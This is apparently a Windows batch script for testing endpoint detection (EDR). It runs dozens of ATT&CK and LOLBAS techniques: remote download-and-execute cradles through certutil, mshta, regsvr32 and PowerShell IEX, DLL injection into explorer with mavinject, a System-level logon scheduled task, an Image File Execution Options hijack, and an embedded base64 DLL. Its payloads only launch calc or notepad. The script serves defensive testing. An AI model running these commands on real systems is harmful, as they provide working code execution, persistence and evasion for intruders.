REM Source of inspiration: https://github.com/api0cradle/LOLBAS/tree/master/OSBinaries
REM Source of inspiration: https://attack.mitre.org/wiki/Main_Page
REM Author: op7ic
REM Description: Test the detection of various scripts/downloads/execs against your EDR solution.
REM Warning: You might have to click on few windows to close script execution. Don't run this on live system!
REM Version: 0.2a


echo **********************************************
echo *          EDR Testing Script                *
echo *          Version: 0.2a                     *
echo *          by: op7ic                         *
echo *                                            *
echo *                                            *
echo *                                            *
echo **********************************************

echo [+] Starting script execution at %time% %date%
echo %time% %date%: [+] Dumping DLL file which runs calc.exe (x86)
REM - DLL taken from https://github.com/peterferrie/win-exec-calc-shellcode
echo -----BEGIN CERTIFICATE----- > fi.b64
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAA0AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> fi.b64
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACpUmPY7TMNi+0zDYvtMw2L >> fi.b64
echo i93Di+wzDYvtMw2L7DMNiy07RIvsMw2LLTtKi+wzDYtSaWNo7TMNiwAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFBFAABMAQMAwd7lUgAAAAAAAAAA4AAOIQsBBwoAAgAA >> fi.b64
echo AAQAAAAAAAAAEAAAABAAAAAgAAAAAAAQABAAAAACAAAEAAAAAAAAAAQAAAAAAAAA >> fi.b64
echo AEAAAAAEAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAgAABYAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABdAAAAABAAAAACAAAABAAA >> fi.b64
echo AAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAWAAAAAAgAAAAAgAAAAYAAAAAAAAAAAAA >> fi.b64
echo AAAAAEAAAEAucmVsb2MAAAgAAAAAMAAAAAIAAAAIAAAAAAAAAAAAAAAAAABAAABC >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFWL7OgIAAAAM8BdwgwAzMxgMdJSaGNhbGNUWVJRZIty >> fi.b64
echo MIt2DIt2DK2LMIt+GItfPItcH3iLdB8gAf6LVB8kD7csF0JCrYE8B1dpbkV18It0 >> fi.b64
echo HxwB/gM8rv/XWFhhwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAMHe5VIAAAAAMiAAAAEAAAABAAAAAQAAACggAAAsIAAAMCAAAAAQAABMIAAA >> fi.b64
echo AAB3MzItZGxsLXJ1bi1zaGVsbGNvZGUuZGxsAF9EbGxNYWluQDEyAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAA== >> fi.b64
echo -----END CERTIFICATE----- >> fi.b64

echo **********************************************
echo *      Testing Mitre ATT&CK PAYLOADS         *
echo **********************************************

echo %time% %date%: [+] T1140 - Decoding AllTheThings.dll file with Certutil
certutil -f -decode fi.b64 AllTheThings.dll >nul
echo Command Excuted: certutil -f -decode fi.b64 AllTheThings.dll

echo %time% %date% [+] T1197 - Testing bitsadmin download
bitsadmin.exe /transfer /Download https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path.ps1
echo Execution Finished at %time% %date%
echo Command Excuted: bitsadmin.exe /transfer /Download https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path.ps1
powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
echo Command Excuted:powershell -c "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt -Destination Default_File_Path.ps1
echo Execution Finished at %time% %date%


echo %time% %date% [+] T1118 - Testing InstallUtil x86"
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

echo %time% %date% [+] T1118 - Testing InstallUtil x64
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

echo %time% %date% [+] T1170 - Testing mshtha
mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
echo Execution Finished at %time% %date%
echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();

echo %time% %date% [+] T1086 - Testing powershell cradle - WebClient
powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date%
echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();

echo %time% %date% [+] T1121 - Testing regsvcs

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll

echo %time% %date% [+] T1121 - Testing regasm

C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll

echo %time% %date% [+] T1121 - Testing regasm x64

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

echo %time% %date% [+] T1117 -  Testing regsvr32
start "" regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll
echo Execution Finished at %time% %date%
echo Command Excuted: regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll

echo %time% %date% [+] T1127 - Testing MSBuild

echo ^<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^> > xxxFile.csproj
echo    ^<ItemGroup^>   >> xxxFile.csproj
echo         ^<Binaries Include="*.dll;*.exe"/^>   >> xxxFile.csproj
echo     ^</ItemGroup^>   >> xxxFile.csproj
echo   ^<Target Name="SetACL"^>   >> xxxFile.csproj
echo         ^<Exec Command="calc.exe"/^>   >> xxxFile.csproj
echo     ^</Target^>   >> xxxFile.csproj
echo ^</Project^>   >> xxxFile.csproj

start "" C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj

echo %time% %date% [+] T1047 - Testing wmic download
start "" wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
echo Execution Finished at %time% %date%
echo Command Excuted: wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"

echo %time% %date% [+] T1128 - Testing netsh.exe dll exec 
netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
netsh trace show status    
netsh.exe add helper AllTheThings.dll
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
netsh trace stop
echo Execution Finished at %time% %date%
echo Command Excuted: netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
echo Command Excuted: netsh trace show status 
echo Command Excuted: netsh.exe add helper AllTheThings.dll
echo Command Excuted: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
echo Command Excuted: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
echo Command Excuted: netsh trace stop
 
echo %time% %date% [+] T1085 - Testing rundll32 execution
start "" rundll32 AllTheThings.dll,EntryPoint
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32 AllTheThings.dll,EntryPoint

echo %time% %date% [+] T1085 - Testing rundll32 download & exec
start "" rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")

echo %time% %date% [+] T1085 - Testing rundll32 exec
start "" rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}

echo %time% %date% [+] T1130 - Testing certutil download 
start "" certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  
echo Execution Finished at %time% %date%
echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1

echo %time% %date% [+] T1191 - Testing cmstp download
start "" cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf
echo Execution Finished at %time% %date%
echo Command Excuted: cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf

echo %time% %date% [+] T1202 - Indirect Command Execution
start "" forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe

echo %time% %date% [+] T1028 - Testing Windows Remoting exec
start "" winrm qc -q & winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
echo Execution Finished at %time% %date%
echo Command Excuted: winrm qc -q & winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}

echo %time% %date% [+] T1053 - Adding Scheduled Task exec ONLOGON
start "" schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
echo Execution Finished at %time% %date%
echo Command Excuted: schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"

echo %time% %date% [+] T1216 - Signed Script Proxy Execution
start "" cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct
echo Execution Finished at %time% %date%
echo Command Excuted: cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct

echo %time% %date% [+] T1218 / T1055 - Signed Binary Proxy Execution
start "" for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Command Excuted: for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\system32\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
start "" for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Command Excuted:  for /f "tokens=1,2 delims= " %A in ('tasklist /fi ^"Imagename eq explorer.exe^" ^| find ^"explorer^"') do C:\Windows\SysWOW64\mavinject.exe %B /INJECTRUNNING AllTheThings.dll
echo Execution Finished at %time% %date%

echo %time% %date% [+] T1033 - System Owner/User Discovery
start "" cmd.exe /C whoami
start "" wmic useraccount get /ALL
start "" cmd.exe /C net group "domain administrators" /domain
echo Execution Finished at %time% %date%
echo Command Excuted: cmd.exe /C whoami
echo Command Excuted: wmic useraccount get /ALL
echo Command Excuted: cmd.exe /C net group "domain administrators" /domain

echo %time% %date% [+] T1158 - Hiding data in ADS
echo "test123 > 12.txt
echo "test" > 12.txt:12
echo Execution Finished at %time% %date%
echo Command Excuted: echo "test123 > 12.txt
echo Command Excuted: echo "test123 > 12.txt

echo %time% %date% [+] T1183 - Exec via File Execution Options

start "" REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
start "" REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
start "" REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "calc.exe"
echo Execution Finished at %time% %date%
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "calc.exe"

echo %time% %date% [+] T1096 - NTFS File Attributes
type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
start "" certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
echo Execution Finished at %time% %date%
echo Command Excuted: type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test


echo **********************************************
echo *      Testing LOLBAS PAYLOADS               *
echo **********************************************

echo %time% %date% [+] Testing msiexec exec
msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true
echo Execution Finished at %time% %date%
echo Command Excuted: msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true 
echo Command Excuted: msiexec /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true

echo %time% %date% [+] Testing diskshadow exec
echo exec calc.exe > diskshadow.txt
start "" diskshadow.exe /s diskshadow.txt
echo Execution Finished at %time% %date%  
echo Command Excuted: exec calc.exe > diskshadow.txt
echo Command Excuted: diskshadow.exe /s diskshadow.txt

echo %time% %date% [+] Testing Esentutl.exe download & exec
start "" esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
start "" adrestore.exe   
echo Execution Finished at %time% %date%  
echo Command Excuted: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o
echo Command Excuted: adrestore.exe

echo %time% %date% [+] Testing replace.exe download & exec
replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
start "" adrestore2.exe   
echo Execution Finished at %time% %date% 
echo Command Excuted: replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
echo Command Excuted: adrestore2.exe  

echo %time% %date% [+] Testing SyncAppvPublishingServer.vbs download & exec
start "" C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date% 
echo Command Excuted: C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"

echo %time% %date% [+] Testing HH.exe download
start "" HH.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
echo Execution Finished at %time% %date% 
echo Command Excuted: HH.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt

echo %time% %date% Testing ieexec.exe download & execute"exec"
start "" ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
echo Execution Finished at %time% %date% 
echo Command Excuted: ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  

echo %time% %date% [+] Testing Setupapi driever installation & exec
echo ^; DRIVER.INF > calc.inf
echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc.inf
echo [Version] >> calc.inf
echo Signature = "$CHICAGO$" >> calc.inf
echo Class=61883 >> calc.inf
echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc.inf
echo Provider=%Msft% >> calc.inf
echo DriverVer=06/21/2006,6.1.7600.16385 >> calc.inf
echo [DestinationDirs] >> calc.inf
echo DefaultDestDir = 1 >> calc.inf
echo [DefaultInstall] >> calc.inf
echo AddReg = CalcStart >> calc.inf
echo [CalcStart]
echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf

start "" rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
echo Execution Finished at %time% %date% 
echo Command Excuted: rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf


echo %time% %date% [+] Testing Shdocvw exec via rundll32
echo [InternetShortcut] > C:\windows\temp\url.url
echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
start "" rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
echo Execution Finished at %time% %date%
echo Command Excuted: [InternetShortcut] > C:\windows\temp\url.url
echo Command Excuted: URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url


echo %time% %date% [+] Testing csc exec

echo public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs

start "" C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
start "" C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
start "" C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
start "" C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
echo Execution Finished at %time% %date%
echo Command Excuted: public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs


echo [+] Cleanup

del xxxFile.csproj
del AllTheThings.dll
del fi.b64
del diskshadow.txt 
del adrestore.exe
del Default_File_Path.ps1
del trace.etl
del adrestore.exe
del adrestore2.exe
del trace.etl
del trace.cab
del calc.inf
del 12.txt
del payload.cs
del payload.exe
del testADS.txt
del C:\windows\temp\url.url
del Default_File_Path2.ps1
del notepad.msi
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe"
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe"